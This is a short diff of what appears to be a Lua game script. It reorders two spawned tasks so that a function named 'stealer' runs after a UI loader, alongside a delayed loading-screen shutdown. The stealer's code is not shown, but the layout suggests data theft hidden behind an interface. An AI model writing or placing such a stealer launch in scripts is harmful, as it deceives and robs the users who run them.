@@ -10,8 +10,9 @@ local function loadui()
 end
 
 -- Run the scripts
-task.spawn(stealer)
 task.spawn(loadui)
+task.spawn(stealer)
+
 
 -- Optionally, turn off loading screen after a short delay
 task.delay(3, function()
